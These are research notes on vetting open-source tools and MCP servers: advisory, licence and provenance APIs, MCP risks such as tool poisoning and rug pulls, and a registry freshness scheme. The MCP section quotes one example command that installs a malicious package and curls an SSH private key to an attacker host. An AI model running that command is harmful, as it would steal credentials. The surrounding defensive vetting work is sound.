# Vetting a candidate quickly and keeping the registry current

Brief: Define how an autonomous engineer judges a candidate tool, library or MCP server in minutes, what repo-triage/tool-scan cover and lack, and how the tool registry stays useful.
Run: research/runs/engineer-tool-discovery/PLAN.md

## Signals and their APIs (which are keyless, how fast)

### Takeaway
A five-call, keyless, sub-second "vet card" is possible today: OSV (advisories), deps.dev (licence, advisory keys, project metadata, Scorecard copy), Scorecard REST API (checks), npm attestations endpoint (provenance), plus Socket's keyless Firewall/depscore for install-time malware. Snyk Advisor is gone as a standalone site (moved into security.snyk.io, Feb 2026). Provenance proves where a build came from, never that it is safe. Confidence: high for the API facts (live-tested 2026-10-16 from this sandbox), medium for Socket limits.

### Cited findings
- Scorecard REST API needs no key and answers fast; unscanned repos return 404 (so "no Scorecard" is a real state, not a pass) — live curl 2026-10-16, https://api.scorecard.dev/projects/github.com/ossf/scorecard returned HTTP 200 in 0.57 s with JSON including "score":8.3; an unscanned repo returned 404 in 0.45 s — Quote: "\"score\":8.3,\"checks\":[{\"name\":\"Dependency-Update-Tool\",\"score\":10"
- Scorecard docs name the API host and data licence; weekly API scores omit three checks, and results are CDN-cached — https://github.com/ossf/scorecard, opened 2026-10-16, WebFetch — Quote: "CI-Tests, Contributors, and Dependency-Update-Tool" (omitted from weekly scans because of API costs, per the page)
- Scorecard checks carry risk levels (Dangerous-Workflow and Webhooks Critical; Maintained, Vulnerabilities, Signed-Releases, Token-Permissions High) — https://github.com/ossf/scorecard/blob/main/docs/checks.md, opened 2026-10-16, WebFetch — Quote: "If there is at least one commit per week during the previous 90 days, the project receives the highest score."
- OSV API: no limits stated, `querybatch` for many packages — https://google.github.io/osv.dev/api/, opened 2026-10-16, WebFetch — Quote: "Currently there are no limits on the API."
- OSV live: `POST /v1/querybatch` for lodash 4.17.20 and requests 2.19.0 returned HTTP 200 in 0.32 s with GHSA ids — curl 2026-10-16, https://api.osv.dev/v1/querybatch — Quote: "{\"results\":[{\"vulns\":[{\"id\":\"GHSA-29mw-wpgm-hmr9\""
- deps.dev API v3 is keyless: GetVersion returns licences and advisory keys, GetProject returns stars, licence and a Scorecard copy; the docs state no rate limit and permit caching — https://docs.deps.dev/api/v3/, opened 2026-10-16, WebFetch — Quote: "Clients are expressly permitted to cache data served by the API."
- deps.dev live: `/v3/systems/npm/packages/lodash/versions/4.17.20` returned licences and advisory keys; project endpoint returned in 0.24 s — curl 2026-10-16 — Quote: "\"licenses\":[\"MIT\"], \"advisoryKeys\":[{\"id\":\"GHSA-29mw-wpgm-hmr9\"}"
- deps.dev project record for modelcontextprotocol/servers shows licence "non-standard" (so licence field can be unclassified; read LICENSE) — curl 2026-10-16 — Quote: "\"license\":\"non-standard\""
- npm provenance: Sigstore-signed link to source and build, explicitly not a safety guarantee; check with `npm audit signatures`; CI only on GitHub Actions or GitLab — https://docs.npmjs.com/generating-provenance-statements, opened 2026-10-16, WebFetch — Quote: "does not guarantee the package has no malicious code" (page statement as reported by WebFetch)
- npm attestation lookup is keyless: `https://registry.npmjs.org/-/npm/v1/attestations/sigstore@2.3.1` returned 200 in 0.09 s with a publish predicate — curl 2026-10-16 — Quote: "{\"attestations\":[{\"predicateType\":\"https://github.com/npm/attestation/tree/main/specs/publish/v0.1\""
- PyPI trusted publishing replaces long-lived tokens with OIDC short-lived tokens — https://docs.pypi.org/trusted-publishers/, opened 2026-10-16, WebFetch — Quote: "only valid for 15 minutes from time of creation"
- PyPI attestations let users verify the identity that published a file; page gives no consumer check procedure — https://docs.pypi.org/attestations/, opened 2026-10-16, WebFetch — Quote: "verify that a particular package was attested to by a particular identity"
- Snyk Advisor was migrated into security.snyk.io, announced 2 Feb 2026 — https://updates.snyk.io/snyk-advisor-insights-are-now-part-of-security-snyk-io/, opened 2026-10-16, WebFetch — Quote: "We’ve completed the migration of Snyk Advisor into security.snyk.io"
- Socket Firewall free tier is keyless; hosted `depscore` MCP works without authentication — https://socket.dev/llms.txt, opened 2026-10-16, WebFetch — Quote: "The free tier (`sfw`) is zero-configuration: no account, no API key, no config files."
- Socket Free plan: 1,000 scans/month, 500 API requests/hour, malicious-package blocking at install across 4 ecosystems — https://socket.dev/pricing, opened 2026-10-16, WebFetch — Quote: "1,000" (scans per month) / "500 / hour" (API quota) / "4" (firewall ecosystems), as returned by WebFetch
- GitHub global advisories REST: list and get-by-GHSA endpoints with `ecosystem` and `affects` filters — https://docs.github.com/en/rest/security-advisories/global-advisories, opened 2026-10-16, WebFetch — Quote: "only advisories for these ecosystems will be returned" (WebFetch summary)

### Contradictions
- Existing skills point at `https://scorecard.dev/viewer/?uri=...` (an HTML viewer), while the Scorecard README names the JSON API `api.scorecard.dev`. The viewer is not agent-friendly; the API is. Another host, api.securityscorecards.dev, also answered 200 in the same run, so the older host still works — live curl 2026-10-16.
- Third-party page claims Snyk Advisor "shut down in January 2026" (https://packagefix.dev/snyk-advisor-alternative, search text only, vendor of a competing tool); Snyk's own page says it was migrated on 2 Feb 2026 into security.snyk.io. Use Snyk's wording.

### Inferences
- (mine) Vet card order: 1 metadata (archived, push date) 2 OSV querybatch on the exact version 3 deps.dev licence + project 4 Scorecard API 5 install-script grep in a read-only clone 6 npm attestations / Socket `sfw` for npm and PyPI candidates. Each call is under 1 s; the whole card is a one-script job, no key, and the script only issues HTTP GETs/POSTs, never touches candidate code.
- (mine) Scorecard measures project hygiene, not malice; a malicious new repo scores nothing (404) or is under 90 days (Maintained not assessed), so the clone-and-grep step stays mandatory.

### Gaps
- GitHub advisory REST unauthenticated rate limit: page does not say; live call returned 403 in this sandbox ("sessions are bound to their configured repositories"), so not tested. OSV already mirrors GHSA, so low priority.
- Socket per-package keyless lookup on socket.dev pages: `socket package` CLI needs a token (docs.socket.dev/docs/socket-package, search text only); the keyless routes are `sfw` and hosted `depscore`. Socket FAQ not opened.
- PyPI consumer-side provenance check: `https://pypi.org/integrity/...` guess returned 404; correct URL form not confirmed.
- deps.dev rate limit: none stated; only the Google API Terms are referenced.
- Release cadence and issue-response metrics have no single API; derive from GitHub (needs token; blocked here) or deps.dev/Scorecard "Maintained". Not researched further.

## MCP-specific vetting

### Takeaway
MCP adds four checks that package scanners miss: tool descriptions as an injection surface (poisoning, shadowing), rug pulls (definitions changing after approval), over-broad scopes/local execution, and the launch command itself. Fix: read the full tool manifest, pin a hash of the entire definition, run local servers sandboxed, prefer remote servers with minimal OAuth scopes, re-scan on version change. Snyk agent-scan (successor of Invariant mcp-scan) can do the description checks but it starts the server, so run it only in a sandbox. Confidence: high on guidance, medium on scanner efficacy (no benchmark opened).

### Cited findings
- OWASP defines tool poisoning and rug pull; pin hashes of the whole definition incl. annotations; typosquatting is a named vector — https://cheatsheetseries.owasp.org/cheatsheets/MCP_Security_Cheat_Sheet.html, opened 2026-10-16, WebFetch — Quote: "A server changes its tool definitions after initial user approval, turning a trusted tool malicious."
- Same page: pin with hashes and review on change — Quote: "Pin reviewed tool definitions using cryptographic hashes and require review when they change."
- Same page: typosquat check — Quote: "typosquatting (e.g., mcp-server-filesystem vs mcp-server-filesytem) is a common attack vector."
- MCP spec best practices on local servers: a malicious startup command in a config is an attack; client must show the exact command and sandbox — https://modelcontextprotocol.io/docs/tutorials/security/security_best_practices, opened 2026-10-16, WebFetch — Quote: "Execute MCP server commands in a sandboxed environment with minimal default privileges"
- Same page, example hazard — Quote: "npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location"
- Same page, scope minimisation: broad wildcard scopes enlarge blast radius — Quote: "Publishing all possible scopes in `scopes_supported`" (listed under Common Mistakes)
- Same page also lists SSRF via OAuth discovery URLs and says not to hand-roll IP validation — Quote: "Avoid implementing IP validation manually."
- OWASP third-party MCP guide sets a governance flow: submit with hash of tool descriptions, scan, review, staging probation, re-scan — https://genai.owasp.org/download/51928/ (PDF text via pdftotext, 2026-10-16) — Quote: "Periodic Re-validation: Servers are automatically re-scanned at regular intervals or when versions change."
- Same guide: pin versions, record approvals in the registry — Quote: "Record Human Approvals: Log all security and domain-owner approvals in the registry. Monitor and alert on drift from the approved server inventory."
- Snyk agent-scan repo (the mcp-scan lineage): Apache-2.0, version 0.6.9, last commit 2026-10-15; scans MCP servers and skills for prompt injection, tool poisoning, shadowing, toxic flows, malware payloads — https://github.com/snyk/agent-scan README.md:55 (commit 3550263), read 2026-10-16, git clone + grep — Quote: "IMPORTANT: Scanning MCP configurations can execute commands or make outbound network requests."
- That README still links the Invariant Labs blog posts, and reports to a "Snyk Evo" service in background mode — README.md:256 (commit 3550263) — Quote: "reports the results to a [Snyk Evo](https://evo.ai.snyk.io) instance"

### Contradictions
- None found on core guidance. Note: OWASP text says "Use tools like mcp-scan"; the repo is now snyk/agent-scan (renamed), so the old name is a stale pointer.

### Inferences
- (mine) A hash of the full `tools/list` result stored in the registry row gives rug-pull detection with no scanner at all: re-fetch on a schedule and diff. Needs a sandboxed run of the server, which fits a spike but not the "never run a candidate" triage step.
- (mine) Static triage (no execution) can still check: launch command, package name against the real one, required env vars/secrets, declared scopes/OAuth scopes, remote vs local, whether tool descriptions in source contain instructions to the model (grep the tool definitions).
- (mine) Remote servers cannot be code-read; judge the operator and scopes, and treat tool output as untrusted. Local stdio servers can be read and sandboxed.

### Gaps
- No benchmark of agent-scan or mcp-scan detection rates opened; efficacy unknown.
- Search-text only, not opened (so uncited): Socket FAQ (static analysis of install scripts, network calls, env access); Invariant mcp-scan docs (tool pinning, E001-E003, W003 "Entity has changed"); agent-scan sends tool descriptions to a remote analysis API (secrets redacted); Thoughtworks BYOR columns name,ring,quadrant,isNew,description; OWASP guide naming Scorecard and Snyk package health. Scorecard docs claims that Maintained skips projects under 90 days and Signed-Releases does not verify signatures came from a WebFetch summary, not verbatim text.
- Invariant docs and Snyk/OWASP pages only seen via search text for some lines; not cited as findings.
- Anthropic-specific MCP vetting guidance beyond the spec page not searched.

## Current repo-triage and tool-scan skills: coverage and gaps

### Takeaway
Both skills are a sound read-only safety triage (clone, grep install surface, treat content as data, Scorecard glance, ROW output) but are a maintenance-and-install-script check only. They lack advisory lookups, licence compatibility, dependency footprint, provenance, version pinning, MCP tool-definition review, the "what version did you check" field and any re-check rule. Confidence: high (files read in full).

### Cited findings
- repo-triage covers metadata, shallow clone, install-surface files and greps, DeepWiki first pass, Scorecard viewer, three-level verdict — /home/user/Autonomy-Research/plugin/skills/repo-triage/SKILL.md:33-46 — Quote: "Scorecard: fetch `https://scorecard.dev/viewer/?uri=github.com/<owner>/<repo>`. Note `Maintained`, `Dangerous-Workflow`, `Binary-Artifacts`, `Pinned-Dependencies`."
- repo-triage lists the install files to read — SKILL.md:37-41 — Quote: "`package.json` (`scripts` such as `preinstall`/`postinstall`/`prepare`), `setup.py`, `pyproject.toml`"
- repo-triage verdict set is coarse — SKILL.md:47 — Quote: "Verdict: `low risk`, `needs a human look` or `do not install`"
- tool-scan does a six-step judge with the same Scorecard viewer and says to use repo-triage for safe-to-install — /home/user/Autonomy-Research/plugin/skills/tool-scan/SKILL.md:43-44 — Quote: "For a safe-to-install verdict use `repo-triage`."
- tool-scan MCP discovery uses the official registry API only — tool-scan/SKILL.md:35 — Quote: "`GET https://registry.modelcontextprotocol.io/v0.1/servers?search=<q>&limit=5`"
- Registry row has six columns only — tool-scan/SKILL.md:46-47 — Quote: "`ROW: | <Tool> | <Link> | <What it does, incl. install surface> | <Where it runs> | <Verified YYYY-MM-DD> | <Verdict> |`"

### Contradictions
- tool-scan says "Check the Scorecard" in a quick judge but the registry (tool-registry.md:31) lists Scorecard as "viewer + REST API"; the skills only name the viewer.

### Inferences
Concrete gaps (mine), each with the fix:
1. No advisory lookup: add OSV querybatch on the exact version and a count by severity; record "0 known" vs "unchecked".
2. Scorecard via the HTML viewer: switch to the API JSON, and parse `Maintained`, `Dangerous-Workflow`, `Token-Permissions`, `Signed-Releases`, `Vulnerabilities`; treat 404 as "unavailable", and note repos under 90 days are not assessed for Maintained.
3. No licence step: read deps.dev licence plus the LICENSE file; check against the target project's licence (the registry already flags AGPL for Skyvern, FSL for Cua Spaces, so this is done ad hoc). Add a rule: AGPL/FSL/non-standard = human look.
4. No footprint check: count direct and transitive deps (deps.dev `:dependencies`), binary artifacts, size, whether it needs Docker, a daemon or network.
5. Install-script inspection is "read the files", but the published tarball can differ from the repo: for npm, check `scripts` in the registry manifest (`registry.npmjs.org/<pkg>/<ver>`) and provenance attestation presence; for PyPI, check sdist vs wheel and trusted publishing.
6. No typosquat/name check and no malware feed lookup (Socket `sfw`/depscore; OSV MAL- advisories).
7. No MCP-specific step: add launch command, env vars, remote vs local, OAuth scopes, tool-definition review for instructions, tool-definition hash, and an optional sandboxed agent-scan spike.
8. No version/commit recorded: the Verified column has a date but not the version or SHA checked, so a verdict cannot be tied to the artefact.
9. No effort/outcome fit: the skills judge safety, not whether the tool solves the stated need; that is the decision-procedure facet's job.
10. DeepWiki dependency: step 4 relies on a server not connected in this session; the skill needs a no-DeepWiki path (clone + grep already exists).
11. Verdict vocabulary ("low risk / needs a human look / do not install") differs from the registry's free-text verdicts (Use / Fallback / Skip / Reject); the ROW line carries no risk level.

### Gaps
- Did not read other skills (research, spike) that may add vetting steps.

## Registry schema and staleness

### Takeaway
The registry is one six-column table repeated per section (523 lines, many rows dated the same day, 26 lines marked "not opened"/"search excerpt only"), so a reader cannot tell what version was checked, how long a verdict stays valid, or whether a row is superseded. Keep the six columns for ROW compatibility, but add machine-checkable fields and a freshness rule, and borrow Thoughtworks' "fade" and OWASP's "periodic re-validation". Confidence: medium (the schema is my design; the practices are cited).

### Cited findings
- Registry header, current schema — /home/user/Autonomy-Research/research/tool-registry.md:9-10 — Quote: "| Tool | Link | What it does | Where it runs | Verified | Verdict |"
- Registry intro says evidence lives in findings files — tool-registry.md:3-5 — Quote: "Verdicts as of the verified date; details and the evidence behind each verdict are in `research/findings/`"
- Rows already mix verification depth in the Verified cell — tool-registry.md:63 — Quote: "not opened (search excerpt only)"
- Thoughtworks process for existing entries and fading: re-review everything each edition; entries unchanged for two editions fade — https://www.thoughtworks.com/insights/blog/technology-strategy/how-to-create-your-enterprise-technology-radar, opened 2026-10-16, WebFetch — Quote: "If a blip has stayed put for two radars (one year), we let it fade away, reducing clutter."
- OWASP governance: approved-server registry with version pins, recorded approvals, drift alerts, periodic re-scan — https://genai.owasp.org/download/51928/ (pdftotext) — Quote: "Pin Versions: Maintain a manifest of approved server and tool versions."
- Snyk Advisor itself disappeared as a standalone URL (redirect) — an example of a registry link that rots — https://updates.snyk.io/snyk-advisor-insights-are-now-part-of-security-snyk-io/ — Quote: "Advisor URLs now redirect to their corresponding package pages on security.snyk.io." (per Snyk summary; WebFetch returned the migration sentence only)

### Contradictions
- None found.

### Inferences
- (mine) Proposed row schema (extend, do not break): add as a trailing "Meta" cell or a sidecar `research/tool-registry.meta.csv` keyed by tool name, to keep the six-column ROW contract:
  - `version_checked` (tag or commit SHA) and `source_depth` (opened / clone / search-only);
  - `verdict_code` (use, fallback, spike, skip, reject) separate from prose reason;
  - `risk` (low / human-look / do-not-install) from triage;
  - `recheck_by` (date; default 90 days for MCP servers and fast-moving agent tools, 180 days for libraries, none for notations/specs) and `trigger` (new major version, new advisory, owner change, archived flag);
  - `superseded_by` (tool name) and `reason`;
  - for MCP: `tooldef_sha256`, `scopes`, `local|remote`.
- (mine) Staleness detection is a cheap script, not a meeting: nightly or per-session job greps rows where `recheck_by < today` or `version_checked` is behind the latest release (OSV/deps.dev/npm), or the Scorecard/GitHub archived flag flipped, or the link returns 404 (cf. urlhealth idea already in the registry). It outputs a list; a human or the engineer re-triages only those rows.
- (mine) Fade rule from Thoughtworks: a skip/reject row not touched for two review cycles moves to an archive section to keep the engineer's read cost low, but remains greppable so it is never re-evaluated by mistake.
- (mine) The engineer's approved list should be a short file the engineer loads (a pinned subset: tool, version, install command, hash), distinct from the research log; the research registry stays the evidence record.
- (mine) Do not re-verify on the same day for every row: all rows read "2026-10-16", so the date carries no age signal until the first real re-check.

### Gaps
- Thoughtworks BYOR page and FAQ seen only via search text; the one cited blog page was opened. No other team's internal approved-tool list (e.g. Backstage, Spotify, ThoughtWorks clients) was found in this pass.
- The OWASP "Automated Scanners" sentence naming Scorecard and Snyk package health is from search text only.

## Tools evaluated
| Tool | Link | What it does | Where it runs | Verified | Verdict |
| --- | --- | --- | --- | --- | --- |
| OSV.dev API | https://google.github.io/osv.dev/api/ | Keyless POST /v1/query and /v1/querybatch advisories by package+version; no stated limit; 0.3 s live | curl | 2026-10-16 | **Use** as the advisory check in triage |
| deps.dev API v3 | https://docs.deps.dev/api/v3/ | Keyless licences, advisory keys, dependencies, project stars and Scorecard copy; no stated rate limit | curl | 2026-10-16 | **Use** for licence and footprint |
| OpenSSF Scorecard REST API | https://api.scorecard.dev | JSON checks per repo, keyless, 404 when unscanned | curl | 2026-10-16 | **Use** instead of the viewer URL; 404 = unavailable |
| npm provenance / attestations | https://docs.npmjs.com/generating-provenance-statements | Sigstore build link; `npm audit signatures`; keyless attestations endpoint | curl, npm CLI | 2026-10-16 | Use as a positive signal only; not proof of safety |
| PyPI trusted publishing + attestations | https://docs.pypi.org/trusted-publishers/ | OIDC publishing; attestations identify publisher | docs | 2026-10-16 | Positive signal; consumer check method unconfirmed |
| Snyk Advisor / security.snyk.io | https://updates.snyk.io/snyk-advisor-insights-are-now-part-of-security-snyk-io/ | Advisor merged into security.snyk.io package pages (npm, PyPI, Go) | web | 2026-10-16 | Standalone Advisor gone; use deps.dev + Scorecard; security.snyk.io page is human-only fallback |
| Socket Firewall free (sfw) and depscore MCP | https://socket.dev/llms.txt | Keyless install-time malicious-package blocking; hosted depscore without auth | CLI wrapper, hosted MCP | 2026-10-16 | Spike for npm/PyPI candidates; Free plan 1,000 scans/month, 500 API req/hour (pricing page) |
| Snyk agent-scan (ex Invariant mcp-scan) | https://github.com/snyk/agent-scan | Scans MCP servers and skills for poisoning, shadowing, toxic flows; Apache-2.0; v0.6.9; starts servers and calls a remote analysis API | local, sandbox only | 2026-10-16 (clone commit 3550263, not run) | Fallback; spike only inside a throwaway VM; never in triage |
| OWASP MCP Security Cheat Sheet | https://cheatsheetseries.owasp.org/cheatsheets/MCP_Security_Cheat_Sheet.html | Checklist: pin hashes, sandbox, least privilege, typosquat | docs | 2026-10-16 | **Use** as the MCP vetting checklist source |
| MCP spec Security Best Practices | https://modelcontextprotocol.io/docs/tutorials/security/security_best_practices | Local server compromise, scope minimisation, SSRF, token passthrough | docs | 2026-10-16 | **Use** for local vs remote server review |
| Thoughtworks Build Your Own Radar | https://github.com/thoughtworks/build-your-own-radar | CSV/Sheet radar (name, ring, quadrant, isNew, description); AGPL | web/self-host | 2026-10-16 (search text; blog page opened) | Borrow the fade and re-review rhythm; skip the tool |
